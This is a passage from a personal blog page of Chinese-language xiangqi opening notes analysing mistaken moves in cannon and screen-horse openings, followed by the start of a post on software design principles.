<p>然而如果黑没有抬双横车，而是改走炮2平1，企图出直车 ，那么就给了红出直车的机会，黑方将会遭到红左炮封车，形成如图所示局面</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322010833278.png" alt="image-20250322010833278"></p>
<p>在该局面下，黑方巡河车企图兑卒活马，实际上黑方也就只有一个车能走着玩了，另一个车以及两匹马都呆瓜潮脸的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322011158972.png" alt="image-20250322011158972"></p>
<p>红方必须点车二路，马上就要拍马屁</p>
<p>下一步黑方要是补士直接就拍7马屁股</p>
<p>要是继续冲卒，冲3卒就拍3马屁股，冲7卒就拍7马屁股</p>
<h4 id="第10局-突发冷箭"><a href="#第10局-突发冷箭" class="headerlink" title="第10局 突发冷箭"></a>第10局 突发冷箭</h4><p>突袭王</p>
<p>红黑双方卧龙凤雏，走成这个局面，甚至都没法命名</p>
<p>黑方左车老鼠一样钻到红方被窝里，然后平到2路捉炮同时封车，红方不需要躲炮，直接平车邀兑，弃马，先弃后取</p>
<p>勾引黑右炮发射打马，使得黑左马脱根，红再用右车压黑马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322014607629.png" alt="image-20250322014607629"></p>
<h4 id="第11局-并非急所"><a href="#第11局-并非急所" class="headerlink" title="第11局 并非急所"></a>第11局 并非急所</h4><p>松弛王</p>
<p>顺炮直车对缓开车 - 黑过河炮</p>
<p>在当前局面下，红方跳起双正马，黑方正着也是右马正起，</p>
<p>然而误走炮2平3压马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322015954736.png" alt="image-20250322015954736"></p>
<p>走这么一步炮意义不明，相当于让了一先，这将导致黑方右车出不来</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020338512.png" alt="image-20250322020338512"></p>
<p>在当前局面下，黑方企图出右直车，红方直接送七兵然后马七进八由车生根，后面套着炮打黑车，爽的一批</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020449687.png" alt="image-20250322020449687"></p>
<p>把黑车赶回去之后，红再炮八平七打马，黑送3卒之后上马，又暴露了底象，红炮轰底象，取得底线巨大攻势</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020717700.png" alt="image-20250322020717700"></p>
<h4 id="第12局-梦笔生花-✨"><a href="#第12局-梦笔生花-✨" class="headerlink" title="第12局 梦笔生花 ✨"></a>第12局 梦笔生花 ✨</h4><p>做梦王</p>
<p>顺炮直车对缓开车 - 黑过河炮局面下，当红方跳起正马之后，黑方唯一正着也是跳正马，但是黑方出左横车，看似没有问题，实际上和右炮过河不搭配，不够紧凑。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322022231413.png" alt="image-20250322022231413"></p>
<p>此时黑方左马脱根，但是直接车二进六再平三压的话，黑可以炮2平7打兵倒勾保马。基于上述思考红方立刻兵三进一送兵，让黑右炮打不过来，然后再进车压马就可以了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322022717748.png" alt="image-20250322022717748"></p>
<p>黑左马非常尴尬，如果再车9进1保马，那黑左车相当于白让了一先</p>
<p>如果马7进6，这个马也没人看管，会遭到红车8平6抠马，并且此时黑中卒失守</p>
<h4 id="第13局-秣马厉兵"><a href="#第13局-秣马厉兵" class="headerlink" title="第13局 秣马厉兵"></a>第13局 秣马厉兵</h4><p>莱茵王</p>
<p>在顺炮直车对缓开车局面下，黑方后手走逆天两头蛇</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322024652326.png" alt="image-20250322024652326"></p>
<p>此后红方的思路很可能是巡河车兑兵或者骑河车杀卒</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322024928912.png" alt="image-20250322024928912"></p>
<p>然而如果红方真的车八进五骑河，黑抢出右车，红方如果兑车则失先，如果杀卒则面临黑五七炮叠炮打车打马打底象的攻势</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322025136372.png" alt="image-20250322025136372"></p>
<p>因此不如走稳的，直接炮打边卒，两个车一兑，多一个边兵玩残棋</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322025304791.png" alt="image-20250322025304791"></p>
<h4 id="第14局-理想阵型"><a href="#第14局-理想阵型" class="headerlink" title="第14局 理想阵型"></a>第14局 理想阵型</h4><p>想象王</p>
<p>在顺炮直车对横车 - 黑右横车局面下，红方正着是左炮进一然后平三进攻黑7路，或者左炮进二巡河兑兵，</p>
<p>然而红方误走左马冒进，希望当黑平车捉马时再左炮巡河保马，然后卸中炮套在马后打车爽爽</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322030416873.png" alt="image-20250322030416873"></p>
<p>然而黑方也可以卸中炮格挡，并且随时有炮击底士打车同时捉炮的手段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322030731253.png" alt="image-20250322030731253"></p>
<p>只能说，红方左马冒进然后左炮巡河，建立河口阵地的想法，是一厢情愿</p>
<h2 id="中炮对屏风马"><a href="#中炮对屏风马" class="headerlink" title="中炮对屏风马"></a>中炮对屏风马</h2><h3 id="疑形-1"><a href="#疑形-1" class="headerlink" title="疑形"></a>疑形</h3><h4 id="第15局-炮打双灯"><a href="#第15局-炮打双灯" class="headerlink" title="第15局 炮打双灯"></a>第15局 炮打双灯</h4><p>打炮王</p>
<p>中炮过河车互进七兵对屏风马平炮兑车 红左边炮对黑退边炮上右士</p>
<p>走到当前局面下，红方车八平七杀卒压马，着法过于强硬，会遭到黑方报复</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402193632147.png" alt="image-20250402193632147"></p>
<p>下一步黑炮2进4准备再平3，倒着打车同时打红底七相。</p>
<p>同时黑7路炮瞄着红三相</p>
<p>红窝心马不能兼顾两相</p>
<p>所谓炮打双登实际上就是黑双炮瞄红双相</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402193906042.png" alt="image-20250402193906042"></p>
<p>此时红方没法吃黑马，因为黑炮2平3打死车。</p>
<p>红方如果冲七兵想要再把兵平开然后吃马，这样来不及</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195547220.png" alt="image-20250402195547220"></p>
<p>黑方炮2平3驱赶红车，然后车2进8准备再平4抽车，同时打底象叫闷杀</p>
<p>此时红必须车六退三抓黑炮</p>
<p>黑方如果足够大胆直接就开始炮打双灯了，保守一点可以车八退二看炮，同时伏有炮打底相抽红车的手段。</p>
<p>并且借助炮打双灯可以白飞掉红七兵，此局面黑方大优</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195749530.png" alt="image-20250402195749530"></p>
<p>上变如果红不走兵七进一，改走马七进六</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195955720.png" alt="image-20250402195955720"></p>
<p>黑方照样是先平炮打车然后车2进8准备再平4拉住红车马</p>
<p>如果红马踩中卒则抬另一个车拉住</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402200121082.png" alt="image-20250402200121082"></p>
<h4 id="第16局-神兵天降"><a href="#第16局-神兵天降" class="headerlink" title="第16局 神兵天降"></a>第16局 神兵天降</h4><p>兵王</p>
<p>中炮过河车互进七兵对屏风吗左马盘河 红左边炮对黑飞右象 局面下</p>
<p>黑炮2进1打算冲3卒打车反击。</p>
<p>然而这招棋实际上有大问题，甚至我这种菜鸡都知道走这么一步太怪了，太缓了。</p>
<p>此时红方就可以考虑打中兵叫抽，</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202249283.png" alt="image-20250402202249283"></p>
<p>但是黑方还有一匹3马在防守，可以考虑勾引黑3马离开位置。</p>
<p>直接炮九进四，送到马口上</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202617068.png" alt="image-20250402202617068"></p>
<p>如果黑贪吃，那么中兵失守</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202724075.png" alt="image-20250402202724075"></p>
<p>红方先弃后取，车八进六吃炮，然后再炮五进四抽车得回失子。</p>
<p>此局面下红方车马灵活，炮镇当头，并且牵住了黑无根车炮，红大优</p>
<h4 id="第17局-多事之秋"><a href="#第17局-多事之秋" class="headerlink" title="第17局 多事之秋"></a>第17局 多事之秋</h4><p>事包王</p>
<p>中炮对屏风马互进三兵局面下，红方左炮过河准备平七压马或者平三打卒压马。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402203532777.png" alt="image-20250402203532777"></p>
<p>黑方眼看7卒没法挺进，7马已经被压制，因此赶紧跳起3马防止被压，同时伏有卒3进1踩炮反击的手段。然而黑方来不及</p>
<p>此时红方眼见就有骑河车抓马的手段，抓的跟浪鸭子似的</p>
<p>如果黑马3进4</p>
<p>需要注意的是，红左马可以弃掉，反正直接抬横车保持先手，随时可以得回失子。</p>
<p>如果这时候把已经出去的高车倒回来抓马，那就成了逛花园了，三兵也会送掉。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402204521121.png" alt="image-20250402204521121"></p>
<p>如果黑马3进2，那么红要把七路车退回来拦，因为此时黑马后面有炮看着。</p>
<p>接下来红方就寻求劣马换黑好马，赚取步数上的优势。</p>
<h4 id="第18局-沿河之争"><a href="#第18局-沿河之争" class="headerlink" title="第18局 沿河之争"></a>第18局 沿河之争</h4><p>抢河王</p>
<p>中炮对屏风吗互进三兵局面下</p>
<p>红方过河炮，准备平七或者平三压马</p>
<p>此时黑方正手是飞7象，为什么不是3象呢？</p>
<p>因为黑方7卒被瞄，如果飞3象则红炮八平三打卒瞄黑底7象，同时红三兵伺机过河</p>
<p>因此飞7象可以避免这个隐患</p>
<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20250402205852088.png" alt="image-20250402205852088"></p>
<p>此后红炮八平七压马，瞄黑底3象。总之就是黑飞哪个象，红就瞄另一个象</p>
<p>接下来的局面，黑方巡河炮伺机兑7卒活马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402210330108.png" alt="image-20250402210330108"></p>
<p>接下来黑挺7卒，红方不应该立刻兑兵，而是应该右车巡河，注意是右车，因为右车有面临黑借助巡河炮上外马打车的手段。</p>
<p>红方右车巡河后，黑方也不应该立刻7卒过河，否则这样会送给红方车二平三一步棋，红有高车，黑两车都不好出，红优。</p>
<p>黑方的正着是补士等一手。</p>
<p>此后红方走成四兵见面。黑方只能是死守，因为红方是巡河车比黑方巡河炮快。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402212813196.png" alt="image-20250402212813196"></p>
<p>双方在河口剑拔弩张，红方阵型显然更好，车更靠前，双马灵活。接下来红方双马可以随时跃出参战。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402213037610.png" alt="image-20250402213037610"></p>
<p>如果黑方仍然死守，比如车8平6，那么红方七兵过河之后再上左马踩黑炮，红方大优</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402214313226.png" alt="image-20250402214313226"></p>
<h4 id="第20局-迷途羔羊"><a href="#第20局-迷途羔羊" class="headerlink" title="第20局 迷途羔羊"></a>第20局 迷途羔羊</h4><p>羔王</p>
<p>五七炮进三兵对屏风马进三卒局面下</p>
<p>红方右马草率跃起，但是没有明确的进攻目标，只有一个7卒可以踩，其他点位都被黑马防守住。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215022944.png" alt="image-20250402215022944"></p>
<p>此时黑立刻左炮骑河打马</p>
<p>如果红马退回则黑白赚了一步棋</p>
<p>如果红马踩7卒，黑进炮一步，准备打红七兵。红七路炮本来就想打黑3马，因此红方不能接收七兵被打，接下来红又冲七兵。红方一直在走兵马这种弱子。实际上黑方卖了3卒和7卒加速出动了大字。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215416737.png" alt="image-20250402215416737"></p>
<p>最终局面红有一个过河兵，但是黑车出动更快</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215625028.png" alt="image-20250402215625028"></p>
<h4 id="第21局-抢占布置线"><a href="#第21局-抢占布置线" class="headerlink" title="第21局 抢占布置线"></a>第21局 抢占布置线</h4><p>抢线王</p>
<blockquote>
<p>图中高亮行即为布置线，实际上也就是炮台线</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402220447000.png" alt="image-20250402220447000"></p>
</blockquote>
<p>在五七炮互进三兵对屏风马边卒右马外盘河 红左横车对黑飞右象局面中</p>
<p>红右马冒进河口，一使得右车脱根，二使得布置线上少了一个炮架。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221059943.png" alt="image-20250402221059943"></p>
<p>接下来黑方右马踩边卒，踩炮，将黑炮驱离，此时红方布置线就没有炮火防线了。黑左炮占领红右炮台，打马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221405962.png" alt="image-20250402221405962"></p>
<p>如果红方认为一点问题都没有，边马有象防守，继续走马四进三贪兵</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221549202.png" alt="image-20250402221549202"></p>
<p>此时黑炮打马，要求兑车，红方必须兑车因为车没根。</p>
<p>但是黑方接下来弃车，炮1平3打象叫闷宫。</p>
<p>接下来黑方完全可以找回失子，并且两个炮都已经塞到了红方裤裆里</p>
<h4 id="第22局-张冠李戴"><a href="#第22局-张冠李戴" class="headerlink" title="第22局 张冠李戴"></a>第22局 张冠李戴</h4><p>扯淡王</p>
<p>在五六炮左边马对屏风马局面下，傻逼黑方还是要跳外马封车，但是红炮六进三打马，立刻就给赶走了。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402223738878.png" alt="image-20250402223738878"></p>
<p>如此红方两个车都可以顺利出直车，快的一批。这两个车的威慑力太大了，追亡逐北。而黑车出动过于缓慢，难以抗衡。接下来红方只需要两车狠狠前压，至于黑方需要考虑的东西就多了。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402223910299.png" alt="image-20250402223910299"></p>
<p>接下来黑方车1进3守护右侧卒林是关键一招。如果没走出来，让红左车开到这个位置，黑方更加被动，中路有被强行突破的风险。但是黑方守护了右侧，左侧就慢一步，会遭到红右车封压</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402224952250.png" alt="image-20250402224952250"></p>
<p>此时黑1路马已经是瓮中王八，纯坐牢等死</p>
<p>红不慌不忙退马，然后套炮，然后再跳正马，就把黑1路马挤死了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402225138177.png" alt="image-20250402225138177"></p>
<p>总之黑方已经没救了，当黑方用对付五七炮的上外马封车方法，对付五六炮开始，黑方就无了</p>
<h4 id="第23局-先发制人"><a href="#第23局-先发制人" class="headerlink" title="第23局 先发制人"></a>第23局 先发制人</h4><p>先手王</p>
<p>在中炮对屏风马 - 红进三兵 局面下，</p>
<p>此时黑方正着是对挺3卒，保证有一批马活</p>
<p>然而黑方误走右炮分边，其目的是抢出右车，先手捉红炮，加快大子出动</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403005623900.png" alt="image-20250403005623900"></p>
<p>此时红方必须立刻炮八进五，否则让黑方顺利开出直车，红方不好控制局面。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403005857202.png" alt="image-20250403005857202"></p>
<p>此时红八路炮和黑3路马两层隔断，是的黑7路马脱根，容易成为红二路车的攻击对象</p>
<p>接下来如果黑方依旧抢出直车，那么红直接炮换马，接下来右马盘河强攻中路，左马被压无所谓，红右车也拉着黑无根车炮</p>
<p>如果黑方怂了飞象隔断，那么黑7马就是没人管的孤儿，红右车随时过去压马。别慌，先跳起左马，出左直车看住左炮，并且保持左炮封车，这样黑抢出右直车的计划就失败了。</p>
<h4 id="第24局-边马亡"><a href="#第24局-边马亡" class="headerlink" title="第24局 边马亡"></a>第24局 边马亡</h4><p>边马王</p>
<p>在五七炮对屏风马进3卒右马外盘河 局面下，黑方正着是炮8平9兑车，然而黑方看红横车已经走了，于是马2进1踩边卒的一个实惠，同时蹬炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403011952252.png" alt="image-20250403011952252"></p>
<p>但这导致了黑方2路的马后炮封车结构破坏，红方横车完全可以回马枪杀回来捉黑炮，</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403012405932.png" alt="image-20250403012405932"></p>
<p>如果黑方选择换炮，那么黑方两匹马都脱根，结构很差</p>
<p>如果黑方逃炮，那么红车八进二，这马直接就半死不活了。</p>
<p>黑方如果立刻把边卒拱过来，倒是可以找回失子，但是会失掉更多先手</p>
<p>得子和兵三进一，红方是必得其一</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403012606280.png" alt="image-20250403012606280"></p>
<h4 id="第25局-墨守成规-✨"><a href="#第25局-墨守成规-✨" class="headerlink" title="第25局 墨守成规 ✨"></a>第25局 墨守成规 ✨</h4><p>榆木王</p>
<p>红方没有跳双正马，而是左马屯边，此时黑方还是背DNA棋谱平炮兑车，然后退炮打车。</p>
<p>但是这时候红左马屯边就有走五七炮的机会，如果黑方还要退炮打车，那么黑7马就脱根。</p>
<p>红七路炮兵将会对黑3马造成威胁，红出左车压黑3马也可以造成威胁。实际上这里出左车压马更好。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403014308028.png" alt="image-20250403014308028"></p>
<h4 id="第26局-兑子取势"><a href="#第26局-兑子取势" class="headerlink" title="第26局 兑子取势"></a>第26局 兑子取势</h4><p>兑王之王</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403200617291.png" alt="image-20250403200617291"></p>
<p>在此局面下，黑平士角炮，有两个目的，一个是给3马生根，一个支援河口马防止红车顶马</p>
<p>如果能够把这个炮兑掉，黑两两马脱跟，红两车均可逐马</p>
<p>因此红方炮五平四兑炮</p>
<h4 id="第27局-兵贵神速"><a href="#第27局-兵贵神速" class="headerlink" title="第27局 兵贵神速"></a>第27局 兵贵神速</h4><p>冲兵王</p>
<p>中炮过河车七路马对屏风马 红左横车 </p>
<p>在该局面下，黑方炮2平1准备出直车</p>
<p>然而中路一直空虚，接下来红方中兵挺进然后中炮盘头马，攻势强大。</p>
<p>如果黑方仍要出直车，红方还可以退八路炮叠雷公炮，增强中路攻势。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403201720262.png" alt="image-20250403201720262"></p>
<h4 id="第28局-兑不逢时"><a href="#第28局-兑不逢时" class="headerlink" title="第28局 兑不逢时"></a>第28局 兑不逢时</h4><p>兑亡之王</p>
<p>中炮过河车七路马兑屏风马两头蛇 红左横车</p>
<p>在此局面下，黑方刚通过炮2进1驱赶了红右车，感觉红右车走了很多步，想要继续欺负红右车，于是平炮兑车。</p>
<p>然而这是一招疑问手。正着应该补象加厚中路。</p>
<p>此时红方直接右车兑掉黑车，然后再把左车平过来抓马，是有先手的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403202250404.png" alt="image-20250403202250404"></p>
<p>接下来红进车捉双马，黑要么退窝心马要么退炮看，然而此时黑方中路非常空虚，红可以立刻冲中兵，中炮盘头马攻势强大。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403202603466.png" alt="image-20250403202603466"></p>
<p>黑右车根本来不及出，而红车可以追亡逐北</p>
<h4 id="第29局-闻风而动"><a href="#第29局-闻风而动" class="headerlink" title="第29局 闻风而动"></a>第29局 闻风而动</h4><p>怂包王</p>
<p>中炮七路马对屏风马 红进中兵</p>
<p>在此局面下，红方右车没出就挺起中兵，操之过急，没有后续</p>
<p>一般中炮盘头马需要有过河车配合。</p>
<p>黑可以左炮过河封车，如此没有过河车配合，红方中路攻势就是纸老虎</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403204959101.png" alt="image-20250403204959101"></p>
<h4 id="第30局-不同凡响"><a href="#第30局-不同凡响" class="headerlink" title="第30局 不同凡响"></a>第30局 不同凡响</h4><p>装逼王</p>
<p>中炮七路马对屏风马 局面下，</p>
<p>黑方正手是出左直车</p>
<p>然而黑方左马冒进，却没有明确的战略目标，反而削弱了中路防御。 </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403211032163.png" alt="image-20250403211032163"></p>
<p>接下来红方的打击目标就是黑方中路左炮过河打中兵。</p>
<p>如果红方没走出这步棋来，而是走了巡河车或者抬横车，就错失战机了。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403211255696.png" alt="image-20250403211255696"></p>
<h4 id="第31局-兵建奇功"><a href="#第31局-兵建奇功" class="headerlink" title="第31局 兵建奇功"></a>第31局 兵建奇功</h4><p>冲兵王</p>
<p>在中炮右横车对屏风马 红巡河炮</p>
<p>红方目的是通过巡河炮兑换三兵，活通三马。</p>
<p>诚如是，则红方双马活跃，黑方没有中炮，红双马就能肆无忌惮跳出，红方十分满意。</p>
<blockquote>
<p>黑方最佳应手是立刻左马盘河。黑河口马随时踩掉红三兵，挫败红方兑兵计划。且黑河口马也抑制了红左马盘河。且黑有平7炮的权利，可以对红三路施压。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404205956174.png" alt="image-20250404205956174"></p>
<p>此局面下如果红还要挺三兵邀兑就出问题。黑平7炮打马打底象，红难受的狠</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404210933436.png" alt="image-20250404210933436"></p>
<p>因此红方不能再兑三兵了，正手应该车一平四，借助抓马出车。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404211118771.png" alt="image-20250404211118771"></p>
</blockquote>
<p>黑方没走左马盘河，而是左炮平边亮车</p>
<blockquote>
<p>此时红方依旧不能挺三兵邀兑，因为黑方有一手车8进6，准备再平7压马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404211813582.png" alt="image-20250404211813582"></p>
<p>对此红方没有良好的应法：</p>
<p>​	如果炮八退一打车，则黑车8退2用车杀兑兵，还是对红右马和右象施加压力。</p>
<p>​	如果马三进四，则卒7进1，马四进六，车1平3，炮八平三，卒3进1。红方没有便宜，还帮着黑出车。</p>
<p>​	如果兵三进一，则车8平7</p>
</blockquote>
<p>红方应以左马盘河，其目的是抑制黑左马盘河，随时踩黑3卒然后套后炮威胁黑3卒。</p>
<p>黑方应以士4进5，想出贴身车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404213010045.png" alt="image-20250404213010045"></p>
<blockquote>
<p>此时红方必须立刻炮五平六封车。</p>
<p>貌似可以等黑出贴身车时再平炮打车。实际上不然。红方这种错误的构想，其根源在于河口阵地上马有炮生根。黑方可以先走卒3进1破坏红河口阵地，使红河口马脱根，然后再出贴身车。</p>
<p>如图假设红认为可以缓一步，走了个车九进一，黑方不会傻了吧唧出贴身车，而是先卒3进1，之后再出贴身车。诚如是则黑反先</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404213333755.png" alt="image-20250404213333755"></p>
</blockquote>
<p>黑方卒1进1，准备再车1进3守护卒林。此时红方给黑方埋了一个陷阱，兵九进一。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404215158509.png" alt="image-20250404215158509"></p>
<blockquote>
<p>红方这步棋的目的是什么呢？</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404215816119.png" alt="image-20250404215816119"></p>
<p>红右车已经抬起来了，随时可以支援左翼，并且红在左翼集结了两炮一马的重兵。</p>
<p>而黑方补右士暴漏了将门，也阻隔了左车向右支援。</p>
<p>因此红方希望黑接收兑兵，然后双车合并再兑换掉黑1路车，如此黑方右翼空虚，黑左车无法回放，红方可以在黑右翼发动攻势。</p>
</blockquote>
<p>此时红九兵有恃无恐，如果黑方放任不管则红九兵渡河之后急进，会对黑方造成更大压力</p>
<p>因此黑方必须抑制红九兵过河。黑方只有两种方法，要么炮2平1拉住，要么接收兑卒。</p>
<p>接收兑卒是最容易走出的一步棋，但是并不好，红霸王车，准备强夺黑卒，并且要求兑车。红集结重兵的计划进一步得逞。</p>
<p>因此黑只有炮2平1，红马六进七踩兵，同时蹬炮，这步棋势在必行。</p>
<p>此时<strong>黑方只有炮2进3打兵才能周旋</strong>。如果隐忍一步走炮2进1，那么红车一平七支持七兵过河，黑方难以抵抗</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404220809643.png" alt="image-20250404220809643"></p>
<p>总结</p>
<p>当黑方为了应对红左马盘河而士4进5后，就阻挡了黑左车右移的通道。</p>
<p>那么红方的战略目标就是在左翼也就是红右翼集中强大兵力，在黑左车能够支援之前取得优势。</p>
<p>而黑方应该努力打破红方河口阵地的封锁。炮2平1然后出右直车拉住。同时左直车可以伺机进6压马，对红方造成骚扰。</p>
<h4 id="第32局-晕炮如神"><a href="#第32局-晕炮如神" class="headerlink" title="第32局 晕炮如神"></a>第32局 晕炮如神</h4><p>炮王</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">设计模式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:09:00 / Modified: 13:18:44" itemprop="dateCreated datePublished" datetime="2025-04-22T13:09:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><p><a target="_blank" rel="noopener" href="https://github.com/DeutschBall/DesignModel">https://github.com/DeutschBall/DesignModel</a></p>
<h2 id="六原则"><a href="#六原则" class="headerlink" title="六原则"></a>六原则</h2><h3 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h3><p>一个类负责的职责应该尽可能少，最好是单一功能。类应该只有一个引起自己变化的原因。</p>
<p>否则如果有两个以上功能，当用户只是用其中一个功能时还要导入其他无用功能</p>
<h3 id="✨开放封闭原则"><a href="#✨开放封闭原则" class="headerlink" title="✨开放封闭原则"></a>✨开放封闭原则</h3><p>对拓展开放， 对修改关闭</p>
<p>已经写好的代码应该尽可能保持不变，新功能以拓展的形式实现，不应该以修改的形式出现</p>
<p>比如向有些if-else中添加判断条件就不满足改原则</p>
<h3 id="依赖倒置原则"><a href="#依赖倒置原则" class="headerlink" title="依赖倒置原则"></a>依赖倒置原则</h3><p>针对接口编程, 不针对实现编程</p>
<p>变量的声明类型尽量是抽象类或接口，这样我们的变量引用和实际对象间，就存在一个缓冲层，利于程序扩展和优化。</p>
<h3 id="✨里氏替换原则"><a href="#✨里氏替换原则" class="headerlink" title="✨里氏替换原则"></a>✨里氏替换原则</h3><p>一个软件实体如果使用的是一个父类的话，那么一定适用于其子类，而且它察觉不出父类对象和子类对象的区别。也就是说，在软件里面，把父类都替换成它的子类，程序的行为没有变化.</p>
<p>高层模块不能依赖底层模块, 高层模块和底层模块都应依赖抽象.</p>
<p>考虑这么一个问题: 鸟类能否作为企鹅类的父类?</p>
<p>鸟类必须实现fly接口, 如果企鹅类继承鸟类, 意思就是企鹅也有fly接口, 但是企鹅显然不会飞. 因此这继承就不对.</p>
<p>也就是说, 只有子类可以完全替代父类, 才能使用继承.</p>
<h3 id="迪米特法则"><a href="#迪米特法则" class="headerlink" title="迪米特法则"></a>迪米特法则</h3><p>最少知识原则</p>
<p>1.最低访问权限</p>
<p>2.两个类彼此不通信则两个类不应当发生直接的相互作用</p>
<h3 id="✨✨✨合成-聚合复用原则"><a href="#✨✨✨合成-聚合复用原则" class="headerlink" title="✨✨✨合成&#x2F;聚合复用原则"></a>✨✨✨合成&#x2F;聚合复用原则</h3><p>优先使用对象的合成&#x2F;聚合关系，而不是类继承关系</p>
<p>聚合（组合）：弱拥有关系，A对象中可以包含B对象，也可以不包含。A对象和B对象离开对方都能独立存在。 个体与群组。</p>
<p>合成：强拥有关系，严格的部分和整体关系，两者共存亡。 器官与身体</p>
<p>优点是类的继承层次比较小。保持每个类被单独封装，集中精力面对单个任务。</p>
